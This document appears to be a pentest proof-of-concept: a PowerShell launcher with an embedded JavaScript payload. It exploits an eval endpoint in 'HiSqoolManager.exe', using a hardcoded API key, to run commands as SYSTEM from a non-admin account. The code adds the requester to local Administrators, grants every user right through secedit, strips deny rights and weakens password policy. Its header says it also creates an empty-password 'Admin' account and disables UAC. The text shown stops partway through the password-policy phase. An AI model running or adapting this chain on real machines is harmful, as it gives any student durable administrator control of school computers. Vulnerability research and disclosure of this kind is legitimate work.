<#
.SYNOPSIS
  Self-contained POC launcher for the HiSqoolManager.exe
  RCE -> LPE to SYSTEM chain -> local-posture takeover.

  Single-file : le payload JS est embarque en here-string, aucune dependance externe.
  Copiez ce .ps1 sur une cle USB et lancez-le depuis un compte non-admin.

  Goal of THIS launcher :
    * Capture the REQUESTER privilege context (must be non-privileged).
    * Capture the REQUESTER SID (whoami /user) -> passed as the privilege target.
    * Build the JS payload with injected process.env, send it to the
      vulnerable /commands endpoint (category=js / eval), where it is eval'd as
      the SYSTEM process.
    * Wait + retrieves the SYSTEM-side log dir (System32\zcode_poc\<runId>) and
      copies all artefacts back into ./runs/<runId>/, so the evidence travels on
      the USB key.
    * Parses the JSON returned by the payload and computes a per-phase verdict.
    * Identifies *every* system mutation the payload performs, ready to revert.

  Architecture locale-independante :
    - Le SID Admins well-known S-1-5-32-544 est utilise (jamais le nom localise).
    - La cible "requester" est passee en SID (whoami /user). Override par
      --target-user ou --target-sid possible (utile pour RCE LAN distante).
    - Le lanceur lui-meme n'a AUCUN droit admin (verifie + ABORT si elev).

  Important : la plupart des commandes SYSTEM (net user /add, secedit, reg add)
  n'ont d effet reel qu'un redemarrage / re-login plus tard. C'est NORMAL. La POC
  prouve que la mutation a ete validee par Windows (rc=0 et persistances de
  cles/policy). Pas une "prise de pouvoir imediate" - c'est une preuve que
  n'importe quel eleve peut devenir administeur du poste sans redemarrage
  manuel, de maniere durable.

  ASCII-only source so Windows PowerShell parses it regardless of codepage.

.PARAMETER TargetUser
  Optional "DOMAIN\user" override (default = requester running this script).

.PARAMETER TargetSid
  Optional "S-1-5-21-..." override (takes priority over TargetUser).

.PARAMETER NewAdminName
  Name of the local account to create (default "Admin").

.PARAMETER DryRun
  If set, payload executes all read operations but skips every mutation.
  Useful to verify the chain works end to end without modifying the host.

.PARAMETER NoCleanup
  If set, keeps the System32\zcode_poc\ tree on the host. Default = cleanup
  SYSTEM artefact after copying to runs/ (preserve evidence locally).

BUG FIXES applied (audit reference numbers):
  #1  IIFE wrapper captures return value via variable assignment
  #2  No fallback runId - payload aborts if POC_LOG_DIR missing
  #3  FR/ES exception message matching for "already a member"
  #4  /active:yes + Set-LocalUser only if user creation confirmed
  #5  Standardized dry-run guard: mutates:true everywhere, no manual if(!DRY_RUN)
  #6  regRead regex strict - match only REG_DWORD line for the target value name
  #7  runPs via -EncodedCommand (base64 UTF-16LE) - no fragile escaping
  #8  Add-LocalGroupMember -Member uses resolved name, not raw SID string
  #9  SID regex widened to {0,15} sub-authorities for AAD SIDs
  #10 Empty string env vars omitted (Node deletes process.env.X on "")
  #11 SECURITYPOLICY (no underscore) - correct secedit /areas token
  #12 .inf headers properly separated with \r\n
  #13 Comment lines (starting with ;) skipped in [Privilege Rights] parsing
  #14 readInf/writeInf handle UTF-16LE BOM from secedit /export
  #16 Poll poc_complete.marker instead of dir; 60 retries x 1s = 60s
  #19 /passwordreq:no on net user /add
  #23 Fallback to targetSid if targetUser is empty for net user verify
  #26 Removed dead TLS config for plain-HTTP target
  #27 Cleanup only if copy succeeded - prevents evidence loss
  #29 reg query HKU\S-1-5-18\...\Winlogon /v Shell (correct path)
  #30 Top-level try/catch guarantees _flush() on crash
  #32 phaseRc dynamic tracking - summary.phases reflects actual success/failure
  #33 Get-LocalGroupMember -SID (locale-independent) for verify
  #35 Flush [Privilege Rights] when it's the last section of the export
  #48 Resolve admin group name from SID for PS 5.0 compatibility
  #50 New-LocalUser marked { mutates: true }
#>

[CmdletBinding()]
param(
  [string]$TargetUser,
  [string]$TargetSid,
  [string]$NewAdminName = 'Admin',
  [switch]$DryRun,
  [switch]$NoCleanup
)

$ErrorActionPreference = 'Stop'

# ---- Config ------------------------------------------------------------
$Target   = 'http://127.0.0.1:7654'
$ApiPath  = '/commands'
$ApiKey   = 'would-nepal-sing-below'
$ApiUri   = $Target + $ApiPath

# ---- Script location = USB root (drive-letter independent) -------------
if ($PSCommandPath)           { $ScriptDir = Split-Path -Parent $PSCommandPath }
 elseif ($MyInvocation.MyCommand.Path) { $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path }
 else                         { $ScriptDir = (Get-Location).Path }

$HostName = $env:COMPUTERNAME
$Stamp    = Get-Date -Format 'yyyyMMdd_HHmmss'
$RunGroup = 'poc_' + $HostName + '_' + $Stamp
$RunsDir  = Join-Path $ScriptDir 'runs'
$RunDir   = Join-Path $RunsDir $RunGroup
$LogPath  = Join-Path $RunDir ('launcher_' + $HostName + '_' + $Stamp + '.log')
New-Item -ItemType Directory -Force -Path $RunDir | Out-Null

$log = New-Object System.Collections.ArrayList
function W-Log([string]$s){ [void]$log.Add($s) }
function W-Host([string]$s, $color){ Write-Host $s -ForegroundColor $color }
function Tee-Log([string]$s, $color){ W-Log $s; if ($color) { W-Host $s $color } else { Write-Host $s } }
function V-Log([string]$s){ $ts = Get-Date -Format 'HH:mm:ss.fff'; Write-Host "  [$ts] $s" -ForegroundColor DarkCyan }

$ts0 = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
Tee-Log "============================================================" Cyan
Tee-Log " POC launcher  RCE->LPE->SYSTEM->posture takeover"
Tee-Log " generated : $ts0"
Tee-Log " host      : $HostName"
Tee-Log " script dir: $ScriptDir"
Tee-Log " run dir   : $RunDir"
Tee-Log " target    : $Target"
Tee-Log " dry-run   : $DryRun"
Tee-Log "============================================================" Cyan

# =====================================================================
# 0. Requester privilege context (must be NON-privileged)
# =====================================================================
Tee-Log "" $null
Tee-Log "=== [0] Requester privilege context ===" Yellow
V-Log "Creating WindowsPrincipal object..."
$principal = New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
V-Log "Checking Administrator role..."
$isElev = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
$acct   = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
V-Log "Account: $acct"
V-Log "IsElevated: $isElev"
W-Log "requester account        : $acct"
W-Log "requester IsElevatedAdmin: $isElev"
if ($isElev) {
  Tee-Log "ABORT: requester is already admin. The LPE proof would be invalid. Run from a non-admin account on the target." Red
  $log | Set-Content -Path $LogPath -Encoding UTF8
  exit 3
}
Tee-Log "[0] Requester is non-admin: $acct" Green

# --- Capture requestor SID (default target). whoami /user renvoie
#     "USERINFO\n         S-1-5-21-...". On parse le premier S-1-5-...
V-Log "Running whoami /user to capture SID..."
$whoUserRaw = & "$env:WINDIR\System32\whoami.exe" "/user"
V-Log "whoami /user output: $whoUserRaw"
$requesterSid = $null
foreach ($l in $whoUserRaw -split "`r?`n") {
  # [FIX #9] Widened to {0,15} sub-authorities to handle AAD SIDs.
  if ($l -match 'S-1-5-\d+(?:-\d+){0,15}') {
    V-Log "SID found in line: $l"
    $requesterSid = $Matches[0]; break
  }
}
V-Log "Captured SID: $requesterSid"
W-Log "requester SID (whoami /user) : $requesterSid"
W-Log "requester raw                : $whoUserRaw"

if (-not $TargetUser -and -not $TargetSid) {
  V-Log "No explicit target - using requester SID as target"
  if (-not $requesterSid) {
    Tee-Log "ABORT: cannot capture requester SID and no -TargetUser/-TargetSid provided." Red
    $log | Set-Content -Path $LogPath -Encoding UTF8
    exit 3
  }
  $TargetSid = $requesterSid
  V-Log "Target SID set to: $TargetSid"
  Tee-Log "[0] Privilege target = requester SID $TargetSid" Green
} elseif ($TargetSid) {
  V-Log "Explicit target SID provided: $TargetSid"
  Tee-Log "[0] Privilege target = explicit SID $TargetSid" Green
} else {
  V-Log "Explicit target user provided: $TargetUser"
  Tee-Log "[0] Privilege target = explicit user $TargetUser (resolved by payload)" Green
}

# =====================================================================
# 1. TCP reachability
# =====================================================================
Tee-Log "" $null
Tee-Log "=== [1] TCP reachability ===" Yellow
V-Log "Parsing target URI: $Target"
$port  = ([System.Uri]$Target).Port
$host_ = ([System.Uri]$Target).Host
V-Log "Host: $host_  Port: $port"
V-Log "Creating TcpClient..."
$tcp = New-Object System.Net.Sockets.TcpClient
$up = $false; $iar = $null
V-Log "Attempting TCP connect (3s timeout)..."
try {
  $iar = $tcp.BeginConnect($host_, $port, $null, $null)
  if ($iar.AsyncWaitHandle.WaitOne(3000, $false)) { $tcp.EndConnect($iar); $up = $tcp.Connected }
} catch { $up = $false } finally { if ($iar -and $iar.AsyncWaitHandle) { $iar.AsyncWaitHandle.Dispose() }; $tcp.Close() }
V-Log "TCP connected: $up"
if (-not $up) {
  Tee-Log "[1] Service NOT reachable on $Target. Aborting (no false negative)." Red
  $log | Set-Content -Path $LogPath -Encoding UTF8
  exit 2
}
Tee-Log "[1] Target $Target reachable." Green

# =====================================================================
# 3. Build inline JS payload (read from external file for single-source-of-truth)
# =====================================================================
Tee-Log "" $null
Tee-Log "=== [2] Build inline JS payload ===" Yellow

# --- EMBEDDED PAYLOAD JS (single-file, no external dependency) ---
V-Log "Loading embedded JS payload from here-string..."
$payloadBody = @'
// =============================================================================
// poc_payload.js
// -----------------------------------------------------------------------------
// POC : RCE -> LPE to SYSTEM -> local posture takeover.
//
// Vecteur : POST http://127.0.0.1:7654/commands
//           { "category":"js", "command":"eval",
//             "arguments":{ "source": <CE FICHIER LU ET INLINe> } }
//           Header : x-api-key: would-nepal-sing-below
//
// Le "source" est eval'd par HiSqoolManager.exe (NestJS / ScriptorService.evalSource)
// dans un process Node qui tourne en **LocalSystem** sur les cibles.
// Ce fichier est volontairement du JS *lisible* pour le rapport de pentest.
//
// Entrees (passees par le lanceur .ps1 dans arguments, ou ici depuis process.env
// si on veut l'injecter a la main) :
//   LOG_DIR      : dir racine des logs (Syste32\zcode_poc\<runid> = preuve LPE)
//   TARGET_SID   : SID du compte a privilegiier (S-1-5-21-...-1001)  [prioritaire]
//   TARGET_USER  : DOMAIN\user alternatif (resolu en SID by the payload)
//   NEW_ADMIN    : nom du compte a creer ("Admin" par defaut)
//   DRY_RUN      : "1" = tout sauf les mutations (verification seule)
//
// Phases (chacune logge dans payload.log sur disque, preuve durable) :
//   A. Ping identite + resolution cible (SID <-> name)
//   B. Ajouter la cible au groupe Administrateurs (S-1-5-32-544, well-known)
//   C. User Rights Assignment : toutes les privs connues sur la cible (secedit)
//   D. Creer un compte local "Admin" (mdp vide) + l'ajouter aux Admins
//   E. Desactiver l'UAC (EnableLUA=0 + consent = 0 + EnableInstallerDetection=0)
//   F. Verification finale (whoami groupes / reg query / net user / secedit /verify)
//   G. Verify admin account works (runas test: net user, group membership, System32 write, UAC check)
//
// Toutes les commandes passent par child_process.execSync (SYSTEM), leur stdout
// et code de sortie sont logges. Les mutations Windows sont en ASCII pur (reg/net
// sont insensibles a la locale). On n'utilise JAMAIS les noms localises des
// groupes ("Administrateurs" vs "Administrators") : on cible via le SID well-known
// S-1-5-32-544 et via les noms de droits (SeDebugPrivilege etc.) qui sont
// invariants de locale cote secedit.
//
// BUG FIXES applied (audit reference numbers):
//   #1  IIFE wrapper now captures return value for the server
//   #2  No fallback runId generation — abort if POC_LOG_DIR missing
//   #3  FR/ES exception message matching for "already a member"
//   #4  /active:yes + Set-LocalUser only if user creation confirmed
//   #5  Standardized dry-run guard: mutates:true everywhere, no manual if(!DRY_RUN)
//   #6  regRead regex strict — match only REG_DWORD line for the target value name
//   #7  runPs via -EncodedCommand (base64 UTF-16LE) — no fragile escaping
//   #8  Add-LocalGroupMember -Member uses resolved name, not raw SID string
//  #11  SECURITYPOLICY (no underscore) — correct secedit /areas token
//  #12  .inf headers properly separated with \r\n
//  #13  Comment lines (starting with ;) skipped in [Privilege Rights] parsing
//  #14  readInf/writeInf handle UTF-16LE BOM from secedit /export
//  #19  /passwordreq:no on net user /add
//  #23  Fallback to targetSid if targetUser is empty for net user verify
//  #29  reg query HKU\S-1-5-18\...\Winlogon /v Shell (correct path)
//  #30  Top-level try/catch guarantees _flush() on crash
//  #32  phaseRc dynamic tracking — summary.phases reflects actual success/failure
//  #33  Get-LocalGroupMember -SID (locale-independent) for verify
//  #35  Flush [Privilege Rights] when it's the last section of the export
//  #48  Resolve admin group name from SID for PS 5.0 compatibility
//  #50  New-LocalUser marked { mutates: true }
// =============================================================================

'use strict';

const cp = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ---------------------------------------------------------------------------
// 0. Configuration : depuis process.env (overridable depuis le lanceur .ps1 en
//    injectant process.env avant l'eval, ou en dur pour re-run a la main).
// ---------------------------------------------------------------------------
const CFG = {
  LOG_DIR : process.env.POC_LOG_DIR,
  TARGET_SID  : process.env.POC_TARGET_SID  || '',
  TARGET_USER : process.env.POC_TARGET_USER || '',
  NEW_ADMIN   : process.env.POC_NEW_ADMIN   || 'Admin',
  NEW_ADMIN_PWD : process.env.POC_NEW_ADMIN_PWD || '',
  DRY_RUN : (process.env.POC_DRY_RUN === '1' || process.env.POC_DRY_RUN === 'true'),
};

// [FIX #2] No fallback runId — the launcher MUST provide POC_LOG_DIR.
// If missing, the runId would diverge (UTC vs local, no hostname) and
// the launcher could never find the artefacts.
let logDir = CFG.LOG_DIR;
if (!logDir){
  // Cannot operate without the launcher-provided path — abort immediately.
  // Writing to an unknown location defeats the evidence chain.
  process.stderr.write('POC FATAL: POC_LOG_DIR is unset. The launcher must inject it.\n');
  // Return a JSON error so the IIFE wrapper can propagate it.
  throw new Error('no-logdir');
}
const runId = path.basename(logDir);
CFG.LOG_DIR = logDir;

fs.mkdirSync(logDir, { recursive: true });
const logPath = path.join(logDir, 'payload.log');

// Buffered append logger. Auto-flush every 50 lines so the log survives
// a mid-run crash (FIX #30 partial — the global try/catch does the rest).
const _buf = [];
function _flush(){
  try { fs.appendFileSync(logPath, _buf.join('')); _buf.length = 0; }
  catch(e){ /* best effort */ }
}
function L(line){
  const t = new Date().toISOString();
  _buf.push('[' + t + '] ' + line + '\r\n');
  if (_buf.length >= 50) _flush();
}
function Lraw(s){ _buf.push(s + '\r\n'); _flush(); }

// ============================ helper infra =================================
// execSync wrapper : capture stdout/stderr + exit code. Never throws — all
// failures are logged and returned as result objects.
function run(cmd, opts){
  opts = opts || {};
  L('$ ' + cmd);
  // [FIX #5] SKIP on DRY_RUN only for declared mutations (opts.mutates === true).
  // This is the single guard — no redundant if(!CFG.DRY_RUN) wrappers elsewhere.
  if (CFG.DRY_RUN && opts.mutates === true){
    L('  [DRY_RUN] mutation skipped');
    return { cmd, rc:null, out:'', err:'', dry:true };
  }
  try {
    const out = cp.execSync(cmd, {
      windowsHide: true,
      timeout: 30000,
      maxBuffer: 16*1024*1024,
      stdio: ['ignore','pipe','pipe'],
    });
    const s = (out instanceof Buffer) ? out.toString('latin1') : String(out);
    if (s && s.length) Lraw(s.replace(/\s+$/,' '));
    L('  rc=0');
    return { cmd, rc:0, out:s, err:'', dry:false };
  } catch(e){
    const err = (e.stderr instanceof Buffer) ? e.stderr.toString('latin1')
               : (e.stderr ? String(e.stderr) : (e.message||''));
    if (err) Lraw('  [stderr] ' + err.replace(/\s+$/,' '));
    L('  rc=' + (e.status===undefined?'null':e.status) + ' (caught)');
    return { cmd, rc:(e.status===undefined?null:e.status), out:'', err, dry:false };
  }
}

// [FIX #14] readInf/writeInf : secedit exports .inf in UTF-16LE (BOM FF FE).
// Must read as UTF-16LE and write back as UTF-16LE with BOM for secedit
// /configure to accept the file.
function readInf(p){
  try {
    const buf = fs.readFileSync(p);
    if (buf.length >= 2 && buf[0]===0xFF && buf[1]===0xFE) return buf.slice(2).toString('utf16le');
    if (buf.length >= 2 && buf[0]===0xFE && buf[1]===0xFF) {
      const swapped = Buffer.allocUnsafe(buf.length - 2);
      for (let i = 2; i < buf.length; i += 2) { swapped[i - 2] = buf[i + 1]; swapped[i - 1] = buf[i]; }
      return swapped.toString('utf16le');
    }
    if (buf.length >= 3 && buf[0]===0xEF && buf[1]===0xBB && buf[2]===0xBF) return buf.slice(3).toString('utf8');
    return buf.toString('utf8');
  } catch(e){ return ''; }
}

function writeInf(p, txt){
  const bom = Buffer.from([0xFF,0xFE]);
  const body = Buffer.from(txt, 'utf16le');
  fs.writeFileSync(p, Buffer.concat([bom, body]));
}

// [FIX #7] runPs : EncodedCommand base64 bypasses the fragile CMD→PS escaping
// layer. The script is passed as-is with zero character transformation.
function runPs(script, opts){
  const b64 = Buffer.from(script, 'utf16le').toString('base64');
  return run('powershell -NoProfile -NoLogo -NonInteractive -EncodedCommand ' + b64, opts);
}

// Resolution SID <-> name via PowerShell (locale-independent).
function sidFromUser(domainUser){
  const script =
    '$u = "' + domainUser.replace(/`/g,'``').replace(/\$/g,'`$').replace(/"/g,'`"') + '"\r\n' +
    'try { (New-Object System.Security.Principal.NTAccount($u)).Translate(' +
    '[System.Security.Principal.SecurityIdentifier]).Value } catch { "" }';
  const r = runPs(script);
  return (r.out||'').trim();
}
function userFromSid(sid){
  const script =
    '$s = "' + sid + '"\r\n' +
    'try { (New-Object System.Security.Principal.SecurityIdentifier($s)).Translate(' +
    '[System.Security.Principal.NTAccount]).Value } catch { "" }';
  const r = runPs(script);
  return (r.out||'').trim();
}

// [FIX #48] Resolve the localized name of the Administrators group from
// SID S-1-5-32-544. This is needed for Add-LocalGroupMember on PS 5.0
// (where -SID parameter on the group doesn't exist) and is more portable
// than relying on -SID which only works on PS 5.1+.
function adminGroupName(){
  const script =
    'try { (New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")).Translate(' +
    '[System.Security.Principal.NTAccount]).Value.Split("\\")[-1] } catch { "" }';
  const r = runPs(script);
  return (r.out||'').trim();
}

// =============================== pre-flight ================================

L('================================================================');
L(' POC payload started');
L('   runId      : ' + runId);
L('   logDir     : ' + logDir);
L('   dryRun     : ' + CFG.DRY_RUN);
L('   targetSid  : ' + (CFG.TARGET_SID  || '(unset)'));
L('   targetUser : ' + (CFG.TARGET_USER || '(unset)'));
L('   newAdmin   : ' + CFG.NEW_ADMIN);
L('================================================================');

// [FIX #30] Global try/catch guarantees _flush() on any uncaught exception.
// Without this, a mid-run crash (disk full, OOM, etc.) loses all buffered logs.
let _finalResult = null;
try {

// ---------------------------------------------------------------------------
// A. Identite SYSTEM (preuve LPE) + resolution cible
// ---------------------------------------------------------------------------
L(' ====== Phase A — identity preuve + cible resolution ======');

const A = {};
A.host     = os.hostname();
A.user     = os.userInfo();
A.pid      = process.pid;
A.ppid     = process.ppid;
A.cwd      = process.cwd();
A.execPath = process.execPath;
A.platform = process.platform;
A.arch     = process.arch;
A.nodeVer  = process.version;
A.whoami   = run('whoami').out.trim();
A.whoamiAll= run('whoami /all').out;
// [FIX #29] Query the correct path where Shell value actually exists.
A.regHead  = run('reg query "HKU\\S-1-5-18\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell 2>nul').out;
L(' identity dump :');
L('   host     = ' + A.host);
L('   user.uid = ' + A.user.uid + '  user.name = ' + A.user.username);
L('   whoami   = ' + A.whoami);
L('   execPath = ' + A.execPath);
L('   nodeVer  = ' + A.nodeVer);

A.dsreg    = run('dsregcmd /status').out;
fs.writeFileSync(path.join(logDir,'identity.json'), JSON.stringify(A,null,2));

let targetSid  = CFG.TARGET_SID.trim();
let targetUser = CFG.TARGET_USER.trim();

if (!targetSid && !targetUser){
  L(' ERROR : ni POC_TARGET_SID ni POC_TARGET_USER fournis. Abandon Phase B-E.');
  L('         (le lanceur .ps1 doit capturer whoami /user AVANT l envoi HTTP)');
  _finalResult = JSON.stringify({ ok:false, phase:'A', error:'no-target-spec', runId, logDir });
  throw new Error('no-target-spec');
}

if (targetUser && !targetSid){
  targetSid = sidFromUser(targetUser);
  L(' resolved user "' + targetUser + '" -> SID = ' + (targetSid||'(FAILED)'));
  if (!targetSid || !/^S-1-/.test(targetSid)){
    L(' FATAL : resolving target user -> SID failed. Aborting.');
    _finalResult = JSON.stringify({ ok:false, phase:'A', error:'sid-resolve-failed', targetUser, runId, logDir });
    throw new Error('sid-resolve-failed');
  }
}
if (targetSid && !targetUser){
  targetUser = userFromSid(targetSid);
  L(' resolved SID "' + targetSid + '" -> user = ' + (targetUser||'(n/a)'));
}
L(' ---- cible choisie : SID=' + targetSid + '  user=' + (targetUser||'(n/a)'));

// Azure AD detection
const isAzureAD = /^S-1-12-1-/.test(targetSid);
L(' Azure AD account: ' + isAzureAD);
if (isAzureAD) {
  L(' SID starts with S-1-12-1- -> Azure AD / Entra ID account');
  L(' Azure AD accounts have different group membership model');
}

// [FIX #32] Dynamic phase success tracking — replaces hardcoded {A..F:true}.
const phaseRc = { A:true, B:null, C:null, D:null, E:null, F:null, G:null };

// Resolve admin group name once (used in phases B and D).
const adminName = adminGroupName();
L(' resolved admin group name: ' + (adminName||'(n/a)'));

// ===========================================================================
// B. Ajouter le SID cible au groupe Administrateurs (S-1-5-32-544)
// ===========================================================================
L(' ====== Phase B — add target to local Administrators (S-1-5-32-544) ======');
const ADM_SID = 'S-1-5-32-544';

// [FIX #3] FR/ES exception message matching.
// [FIX #8] Use resolved admin group name (-Name) instead of -SID on the group
//          for PS 5.0 compatibility. -Member uses the resolved targetUser name
//          instead of a raw SID string (more portable across PS versions).
//          Fallback to -SID if name resolution failed.
let memberName = (targetUser && targetUser.indexOf('\\') !== -1)
                   ? targetUser.split('\\').pop()
                   : targetUser;
if (!memberName) {
  // targetUser was empty, try resolving from SID
  memberName = userFromSid(targetSid);
  if (memberName && memberName.indexOf('\\') !== -1) memberName = memberName.split('\\').pop();
}
if (!memberName || /^S-1-/.test(memberName)) {
  L(' ERROR: Cannot resolve target to a name. memberName=' + memberName + '. Skipping Add-LocalGroupMember.');
  phaseRc.B = false;
} else {
  if (!adminName) L(' WARNING: adminGroupName() returned empty, falling back to English "Administrators"');
  const groupName = adminName || 'Administrators';
  const psAdd = 'try{\r\n' +
    '  Add-LocalGroupMember -Name "' + groupName + '" -Member "' + memberName + '"' +
    ' -ErrorAction Stop;\r\n' +
    '  "OK"\r\n' +
    '}catch{\r\n' +
    '  if($_.Exception.Message -match "already a member|deja|ya un miembro|existe deja|deja membre"){ "ALREADY" }\r\n' +
    '  else { "ERR:" + $_.Exception.Message }\r\n' +
    '}\r\n';
  const rB = runPs(psAdd, { mutates: true });
  const outB = (rB.out||'').trim();
  L(' Add-LocalGroupMember ' + groupName + ' <- ' + memberName + ' -> ' + outB);

  if (CFG.DRY_RUN) {
    phaseRc.B = 'dry';
  } else {
    phaseRc.B = (rB.rc === 0 || outB === 'ALREADY' || outB === 'OK');
  }
}

// ===========================================================================
// C. User Rights Assignment
// ===========================================================================
L(' ====== Phase C — User Rights Assignment (full privileges to target) ======');

const RIGHTS = [
  'SeTrustedCredManAccessPrivilege', 'SeNetworkLogonRight', 'SeRemoteInteractiveLogonRight',
  'SeBatchLogonRight', 'SeInteractiveLogonRight', 'SeServiceLogonRight', 'SeTcbPrivilege',
  'SeMachineAccountPrivilege', 'SeIncreaseQuotaPrivilege', 'SeChangeNotifyPrivilege',
  'SeUndockPrivilege', 'SeManageVolumePrivilege', 'SeImpersonatePrivilege',
  'SeCreateGlobalPrivilege', 'SeCreatePagefilePrivilege', 'SeCreatePermanentPrivilege',
  'SeCreateSymbolicLinkPrivilege', 'SeDebugPrivilege', 'SeAuditPrivilege', 'SeSecurityPrivilege',
  'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeSystemtimePrivilege',
  'SeProfileSingleProcessPrivilege', 'SeSystemEnvironmentPrivilege', 'SeAssignPrimaryTokenPrivilege',
  'SeRestorePrivilege', 'SeShutdownPrivilege', 'SeBackupPrivilege', 'SeSystemProfilePrivilege',
  'SeCreateTokenPrivilege',
];

const secExportPath = path.join(logDir, 'secedit_export.inf');
const secExportLog  = path.join(logDir, 'secedit_export.log');
const secCfgPath    = path.join(logDir, 'secedit_apply.inf');
const secApplyDb    = path.join(logDir, 'secedit_apply.sdb');
const secApplyLog   = path.join(logDir, 'secedit_apply.log');

L('   export current policy -> ' + secExportPath);
run('secedit /export /cfg "' + secExportPath + '" /log "' + secExportLog + '"', { mutates:false });

let exportText = readInf(secExportPath);
const targetSidEntry = '*' + targetSid;
const rightsStr = RIGHTS.map(r => r + ' = ' + targetSidEntry).join('\r\n');

if (exportText){
  const lines = exportText.split(/\r?\n/);
  const out = [];
  let inPriv = false, pushedOur = false;
  const rightMap = {};
  let _lastPrivKey = null;

  for (let i=0;i<lines.length;i++){
    const l = lines[i];
    if (/^\[Privilege Rights\]/i.test(l)){
      inPriv = true; out.push(l); continue;
    } else if (/^\[.*\]/.test(l)){
      if (inPriv && !pushedOur){
        for (let k=0;k<RIGHTS.length;k++){
          const r = RIGHTS[k];
          const existing = rightMap[r] || [];
          const sids = existing.slice().filter(s => s && s.trim() !== ''); // [FIX BUG-15] drop empties
          if (sids.indexOf(targetSidEntry) === -1) sids.push(targetSidEntry);
          if (sids.length > 0) out.push(r + ' = ' + sids.join(',')); // [FIX BUG-15] skip empty=invalid
        }
        pushedOur = true;
      }
      inPriv = false; out.push(l); continue;
    }
    if (inPriv){
      // [FIX #13] Skip comment lines (starting with ;) before parsing.
      if (/^\s*;/.test(l)) { out.push(l); continue; }
      const m = l.match(/^(\S+)\s*=\s*(.*)$/);
      if (m){
        const rn = m[1].trim();
        const sids = m[2].split(',').map(x=>x.trim()).filter(x=>x && x!=='');
        // Remove SeDeny* for our SID (neutralize deny entries).
        if (/^SeDeny/i.test(rn)){
          const kept = sids.filter(s=>s !== targetSidEntry);
          if (kept.length) out.push(rn + ' = ' + kept.join(','));
          else out.push('; ' + l);
          _lastPrivKey = rn;
          continue;
        }
        rightMap[rn] = rightMap[rn] || [];
        for (let j=0;j<sids.length;j++) if (rightMap[rn].indexOf(sids[j])===-1)
          rightMap[rn].push(sids[j]);
        _lastPrivKey = rn;
        continue;
      }
      // [FIX] Continuation line: no '=' means previous line wrapped — append SIDs.
      if (_lastPrivKey && !l.includes('=')) {
        if (_lastPrivKey && /^SeDeny/i.test(_lastPrivKey)) {
          // SeDeny entries are pushed to out directly, so append there.
          out[out.length - 1] = out[out.length - 1] + ',' + l.trim();
        } else {
          const extraSids = l.trim().split(',').map(x=>x.trim()).filter(x=>x && x!=='');
          if (!rightMap[_lastPrivKey]) rightMap[_lastPrivKey] = [];
          for (let j=0;j<extraSids.length;j++) if (rightMap[_lastPrivKey].indexOf(extraSids[j])===-1)
            rightMap[_lastPrivKey].push(extraSids[j]);
        }
      }
      continue;
    }
    out.push(l);
  }

  // [FIX #35] If [Privilege Rights] was the LAST section (never left via
  // encountering another [Section]), flush our rights before the final append.
  if (inPriv && !pushedOur) {
    for (let k=0;k<RIGHTS.length;k++){
      const r = RIGHTS[k];
      const existing = rightMap[r] || [];
      const sids = existing.slice().filter(s => s && s.trim() !== ''); // [FIX BUG-15] drop empties
      if (sids.indexOf(targetSidEntry) === -1) sids.push(targetSidEntry);
      if (sids.length > 0) out.push(r + ' = ' + sids.join(',')); // [FIX BUG-15] skip empty=invalid
    }
    pushedOur = true;
    inPriv = false;
  }

  if (!pushedOur){
    out.push('[Privilege Rights]');
    for (let k=0;k<RIGHTS.length;k++) out.push(RIGHTS[k] + ' = ' + targetSidEntry);
    pushedOur = true;
  }

  const secText = out.join('\r\n');
  writeInf(secCfgPath, secText);
  L('   generated apply policy (merged) -> ' + secCfgPath);
} else {
  // [FIX #12] Proper .inf headers with \r\n between each line/field.
  const txt =
    '[Unicode]\r\nUnicode=yes\r\n' +
    '[Version]\r\nsignature="$CHICAGO$"\r\nRevision=1\r\n' +
    '[Privilege Rights]\r\n' + rightsStr + '\r\n';
  writeInf(secCfgPath, txt);
  L('   generated minimal apply policy -> ' + secCfgPath);
}

const rC = run('secedit /configure /cfg "' + secCfgPath + '" /db "' +
               secApplyDb + '" /log "' + secApplyLog + '" /quiet /overwrite ' +
               '/areas USER_RIGHTS', { mutates: true });
L('   secedit /configure rc=' + rC.rc + ' see ' + secApplyLog);
phaseRc.C = (CFG.DRY_RUN) ? 'dry' : (rC.rc === 0);
// Force group policy refresh to apply privilege changes immediately
if (!CFG.DRY_RUN) {
  L('   Applying privilege changes...');
  run('gpupdate /force', { mutates: false });
}

// ===========================================================================
// D. Creer un compte local "Admin" (mdp vide)
// ===========================================================================
L(' ====== Phase D — create local "' + CFG.NEW_ADMIN + '" with empty password ======');

const pwdExport = path.join(logDir, 'secedit_pwd_export.inf');
const pwdApply  = path.join(logDir, 'secedit_pwd_apply.inf');
const pwdApplyLog = path.join(logDir, 'secedit_pwd_apply.log');
const pwdApplyDb  = path.join(logDir, 'secedit_pwd_apply.sdb');
L('   export PASSWORD policy -> ' + pwdExport);
// [FIX #11] SECURITYPOLICY (no underscore) — the correct secedit /areas token.
run('secedit /export /cfg "' + pwdExport + '" /quiet /areas SECURITYPOLICY', { mutates:false });

let pwdText = readInf(pwdExport);
let pwdCfg;
if (pwdText){
  const lines = pwdText.split(/\r?\n/); const out=[]; let hit=false;
  for (let i=0;i<lines.length;i++){
    let l = lines[i];
    if (/^\[System Access\]/i.test(l)){ hit=true; out.push(l); continue; }
    if (/^\[.*\]/.test(l)){ if (hit) hit=false; out.push(l); continue; }
    if (hit){
      if (/^\s*MinimumPasswordLength\s*=/.test(l)) { out.push('MinimumPasswordLength = 0'); continue; }
      if (/^\s*PasswordComplexity\s*=/.test(l))   { out.push('PasswordComplexity = 0'); continue; }
      if (/^\s*PasswordHistoryLength\s*=/.test(l)){ out.push('PasswordHistoryLength = 0'); continue; }
      if (/^\s*MaximumPasswordAge\s*=/.test(l))   { out.push('MaximumPasswordAge = -1'); continue; }
      if (/^\s*MinimumPasswordAge\s*=/.test(l))   { out.push('MinimumPasswordAge = -1'); continue; }
    }
    out.push(l);
  }
  if (!/\[System Access\]/i.test(pwdText)){
    out.push('[System Access]');
    out.push('MinimumPasswordLength = 0');
    out.push('PasswordComplexity = 0');
    out.push('PasswordHistoryLength = 0');
